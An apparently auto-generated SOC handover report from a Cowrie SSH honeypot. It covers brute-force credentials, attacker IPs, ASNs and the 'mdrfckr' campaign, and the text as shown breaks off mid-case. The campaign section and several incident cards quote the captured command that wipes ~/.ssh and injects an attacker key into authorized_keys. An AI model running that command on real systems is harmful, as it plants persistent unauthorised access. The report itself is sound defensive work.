# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-11 |
| **Generated At** | 2026-04-11T16:35:46Z |
| **Shift Time** | 16:35 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **178** |
| Confirmed Threats | **151** |
| False Positives Filtered | **27** (15.2%) |
| Unique Attacker IPs | **15** |
| Countries of Origin | **10** |
| High Severity Cases | **66** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **112** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **121** |
| Unique Credential Pairs | **58** |
| Unique Usernames | **21** |
| Unique Passwords | **57** |
| Successful Auth Pairs | **38** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 66 |
| `345gs5662d34` | 32 |
| `ubuntu` | 3 |
| `steam` | 2 |
| `ali` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 33 |
| `345gs5662d34` | 32 |
| `123456` | 2 |
| `root11` | 1 |
| `!QAZ2wsx3edc` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 33 |
| `345gs5662d34` | `345gs5662d34` | 32 |
| `root` | `root11` | 1 |
| `user` | `!QAZ2wsx3edc` | 1 |
| `steam` | `Steam10!` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root11` | `103.49.238.22` | 2026-04-11T14:35:01 |
| `root` | `3245gs5662d34` | `103.49.238.22` | 2026-04-11T14:35:04 |
| `root` | `1234567890987654321` | `81.30.162.19` | 2026-04-11T14:40:22 |
| `root` | `3245gs5662d34` | `81.30.162.19` | 2026-04-11T14:40:27 |
| `root` | `123@123Aa` | `27.112.78.223` | 2026-04-11T14:41:24 |
| `root` | `3245gs5662d34` | `27.112.78.223` | 2026-04-11T14:41:29 |
| `root` | `qwerty!@` | `81.30.162.19` | 2026-04-11T14:41:56 |
| `root` | `QWERTYUIO123456` | `81.30.162.19` | 2026-04-11T14:43:24 |
| `root` | `Qazwsx54321@@` | `81.30.162.19` | 2026-04-11T14:44:53 |
| `root` | `Qwerty1234567` | `81.30.162.19` | 2026-04-11T14:46:22 |
| `root` | `233` | `27.112.78.223` | 2026-04-11T14:46:25 |
| `root` | `Admin2026.` | `81.30.162.19` | 2026-04-11T14:52:27 |
| `root` | `qazwsx666@` | `81.30.162.19` | 2026-04-11T14:55:33 |
| `root` | `P@ssw0rd01` | `81.30.162.19` | 2026-04-11T14:57:01 |
| `root` | `123456qaz` | `81.30.162.19` | 2026-04-11T14:58:30 |
| `root` | `A123a123` | `81.30.162.19` | 2026-04-11T14:59:59 |
| `root` | `qazwsx321@@` | `81.30.162.19` | 2026-04-11T15:01:32 |
| `root` | `kali` | `81.30.162.19` | 2026-04-11T15:04:31 |
| `root` | `XXdd123` | `81.30.162.19` | 2026-04-11T15:07:45 |
| `root` | `aaAA123123` | `81.30.162.19` | 2026-04-11T15:09:16 |
| `root` | `qwe.123456` | `81.30.162.19` | 2026-04-11T15:12:14 |
| `root` | `ChangeMe` | `197.227.8.186` | 2026-04-11T15:50:21 |
| `root` | `3245gs5662d34` | `197.227.8.186` | 2026-04-11T15:50:24 |
| `root` | `admin0$` | `197.227.8.186` | 2026-04-11T15:52:04 |
| `root` | `arthur` | `197.227.8.186` | 2026-04-11T15:58:42 |
| `root` | `Aa@1234` | `197.227.8.186` | 2026-04-11T16:00:23 |
| `root` | `qazwsx321$` | `197.227.8.186` | 2026-04-11T16:02:02 |
| `root` | `abc@123.com` | `197.227.8.186` | 2026-04-11T16:03:48 |
| `root` | `555666` | `197.227.8.186` | 2026-04-11T16:05:34 |
| `root` | `Tm@123456` | `197.227.8.186` | 2026-04-11T16:07:17 |
| `root` | `Qazwsx123321@` | `197.227.8.186` | 2026-04-11T16:14:05 |
| `root` | `Qazwsx12345678!@` | `197.227.8.186` | 2026-04-11T16:15:46 |
| `root` | `aezakmi` | `197.227.8.186` | 2026-04-11T16:17:29 |
| `root` | `qwe1234@` | `197.227.8.186` | 2026-04-11T16:20:56 |
| `root` | `admin12345..` | `197.227.8.186` | 2026-04-11T16:22:46 |
| `root` | `Qazwsx2020@123` | `197.227.8.186` | 2026-04-11T16:24:36 |
| `root` | `Abc123123@` | `43.155.21.198` | 2026-04-11T16:25:49 |
| `root` | `3245gs5662d34` | `43.155.21.198` | 2026-04-11T16:25:52 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **178** |
| Sessions with Fingerprint | **1** |
| Unique HASSH Fingerprints | **1** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 124 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 124 | 8 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 124 | 8 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 33 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `81.30.162.19`, `43.155.21.198`, `27.112.78.223`, `103.49.238.22`, `197.227.8.186`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **15** |
| Unique ASNs | **13** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | LOW |
| `AS5617` | Orange Polska Spolka Akcyjna | 1 | LOW |
| `AS24945` | Telecommunication Company Vinteleport Ltd. | 1 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (66)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-eb61aaedcd0c

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]22` |
| **First Seen** | 2026-04-11 14:35 |
| **Last Seen** | 2026-04-11 14:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:35:01` | `cowrie.session.connect` |
| `2026-04-11 14:35:01` | `cowrie.client.version` |
| `2026-04-11 14:35:01` | `cowrie.client.kex` |
| `2026-04-11 14:35:01` | `cowrie.login.success` |
| `2026-04-11 14:35:01` | `cowrie.session.params` |
| `2026-04-11 14:35:01` | `cowrie.command.input` |
| `2026-04-11 14:35:01` | `cowrie.command.failed` |
| `2026-04-11 14:35:01` | `cowrie.log.closed` |
| `2026-04-11 14:35:02` | `cowrie.session.params` |
| `2026-04-11 14:35:02` | `cowrie.command.input` |
| `2026-04-11 14:35:02` | `cowrie.session.file_download` |
| `2026-04-11 14:35:02` | `cowrie.log.closed` |
| `2026-04-11 14:35:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93c2ef225343

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]22` |
| **First Seen** | 2026-04-11 14:35 |
| **Last Seen** | 2026-04-11 14:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:35:03` | `cowrie.session.connect` |
| `2026-04-11 14:35:03` | `cowrie.client.version` |
| `2026-04-11 14:35:04` | `cowrie.client.kex` |
| `2026-04-11 14:35:04` | `cowrie.login.success` |
| `2026-04-11 14:35:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4560ca9600c4

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:40 |
| **Last Seen** | 2026-04-11 14:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:40:22` | `cowrie.session.connect` |
| `2026-04-11 14:40:22` | `cowrie.client.version` |
| `2026-04-11 14:40:22` | `cowrie.client.kex` |
| `2026-04-11 14:40:22` | `cowrie.login.success` |
| `2026-04-11 14:40:23` | `cowrie.session.params` |
| `2026-04-11 14:40:23` | `cowrie.command.input` |
| `2026-04-11 14:40:23` | `cowrie.command.failed` |
| `2026-04-11 14:40:23` | `cowrie.log.closed` |
| `2026-04-11 14:40:23` | `cowrie.session.params` |
| `2026-04-11 14:40:23` | `cowrie.command.input` |
| `2026-04-11 14:40:24` | `cowrie.session.file_download` |
| `2026-04-11 14:40:24` | `cowrie.log.closed` |
| `2026-04-11 14:40:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e2c4e1d8ff2

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:40 |
| **Last Seen** | 2026-04-11 14:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:40:26` | `cowrie.session.connect` |
| `2026-04-11 14:40:26` | `cowrie.client.version` |
| `2026-04-11 14:40:26` | `cowrie.client.kex` |
| `2026-04-11 14:40:27` | `cowrie.login.success` |
| `2026-04-11 14:40:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25437c8d6c55

| Field | Detail |
|---|---|
| **Source IP** | `27.112.78[.]223` |
| **First Seen** | 2026-04-11 14:41 |
| **Last Seen** | 2026-04-11 14:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:41:23` | `cowrie.session.connect` |
| `2026-04-11 14:41:23` | `cowrie.client.version` |
| `2026-04-11 14:41:23` | `cowrie.client.kex` |
| `2026-04-11 14:41:24` | `cowrie.login.success` |
| `2026-04-11 14:41:25` | `cowrie.session.params` |
| `2026-04-11 14:41:25` | `cowrie.command.input` |
| `2026-04-11 14:41:25` | `cowrie.command.failed` |
| `2026-04-11 14:41:25` | `cowrie.log.closed` |
| `2026-04-11 14:41:25` | `cowrie.session.params` |
| `2026-04-11 14:41:25` | `cowrie.command.input` |
| `2026-04-11 14:41:25` | `cowrie.session.file_download` |
| `2026-04-11 14:41:25` | `cowrie.log.closed` |
| `2026-04-11 14:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.112.78[.]223` to AbuseIPDB if not already reported
- [ ] Block `27.112.78[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e5117498e72

| Field | Detail |
|---|---|
| **Source IP** | `27.112.78[.]223` |
| **First Seen** | 2026-04-11 14:41 |
| **Last Seen** | 2026-04-11 14:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:41:28` | `cowrie.session.connect` |
| `2026-04-11 14:41:28` | `cowrie.client.version` |
| `2026-04-11 14:41:28` | `cowrie.client.kex` |
| `2026-04-11 14:41:29` | `cowrie.login.success` |
| `2026-04-11 14:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.112.78[.]223` to AbuseIPDB if not already reported
- [ ] Block `27.112.78[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ee4f44cdf46

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:41 |
| **Last Seen** | 2026-04-11 14:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:41:55` | `cowrie.session.connect` |
| `2026-04-11 14:41:55` | `cowrie.client.version` |
| `2026-04-11 14:41:55` | `cowrie.client.kex` |
| `2026-04-11 14:41:56` | `cowrie.login.success` |
| `2026-04-11 14:41:56` | `cowrie.session.params` |
| `2026-04-11 14:41:56` | `cowrie.command.input` |
| `2026-04-11 14:41:56` | `cowrie.command.failed` |
| `2026-04-11 14:41:56` | `cowrie.log.closed` |
| `2026-04-11 14:41:57` | `cowrie.session.params` |
| `2026-04-11 14:41:57` | `cowrie.command.input` |
| `2026-04-11 14:41:57` | `cowrie.session.file_download` |
| `2026-04-11 14:41:57` | `cowrie.log.closed` |
| `2026-04-11 14:42:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32579e82e864

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:41 |
| **Last Seen** | 2026-04-11 14:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:41:59` | `cowrie.session.connect` |
| `2026-04-11 14:41:59` | `cowrie.client.version` |
| `2026-04-11 14:41:59` | `cowrie.client.kex` |
| `2026-04-11 14:42:00` | `cowrie.login.success` |
| `2026-04-11 14:42:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-409203018f6a

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:43 |
| **Last Seen** | 2026-04-11 14:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:43:24` | `cowrie.session.connect` |
| `2026-04-11 14:43:24` | `cowrie.client.version` |
| `2026-04-11 14:43:24` | `cowrie.client.kex` |
| `2026-04-11 14:43:24` | `cowrie.login.success` |
| `2026-04-11 14:43:25` | `cowrie.session.params` |
| `2026-04-11 14:43:25` | `cowrie.command.input` |
| `2026-04-11 14:43:25` | `cowrie.command.failed` |
| `2026-04-11 14:43:25` | `cowrie.log.closed` |
| `2026-04-11 14:43:25` | `cowrie.session.params` |
| `2026-04-11 14:43:25` | `cowrie.command.input` |
| `2026-04-11 14:43:25` | `cowrie.session.file_download` |
| `2026-04-11 14:43:25` | `cowrie.log.closed` |
| `2026-04-11 14:43:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a584f31172d

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:43 |
| **Last Seen** | 2026-04-11 14:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:43:28` | `cowrie.session.connect` |
| `2026-04-11 14:43:28` | `cowrie.client.version` |
| `2026-04-11 14:43:28` | `cowrie.client.kex` |
| `2026-04-11 14:43:29` | `cowrie.login.success` |
| `2026-04-11 14:43:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-821c5cada3c5

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:44 |
| **Last Seen** | 2026-04-11 14:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:44:52` | `cowrie.session.connect` |
| `2026-04-11 14:44:52` | `cowrie.client.version` |
| `2026-04-11 14:44:52` | `cowrie.client.kex` |
| `2026-04-11 14:44:53` | `cowrie.login.success` |
| `2026-04-11 14:44:53` | `cowrie.session.params` |
| `2026-04-11 14:44:53` | `cowrie.command.input` |
| `2026-04-11 14:44:53` | `cowrie.command.failed` |
| `2026-04-11 14:44:53` | `cowrie.log.closed` |
| `2026-04-11 14:44:54` | `cowrie.session.params` |
| `2026-04-11 14:44:54` | `cowrie.command.input` |
| `2026-04-11 14:44:54` | `cowrie.session.file_download` |
| `2026-04-11 14:44:54` | `cowrie.log.closed` |
| `2026-04-11 14:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4702f60d6379

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:44 |
| **Last Seen** | 2026-04-11 14:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-11 14:44:56` | `cowrie.session.connect` |
| `2026-04-11 14:44:56` | `cowrie.client.version` |
| `2026-04-11 14:44:56` | `cowrie.client.kex` |
| `2026-04-11 14:44:57` | `cowrie.login.success` |
| `2026-04-11 14:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23d4f258a6ab

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-11 14:46 |
| **Last Seen** | 2026-04-11 14:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
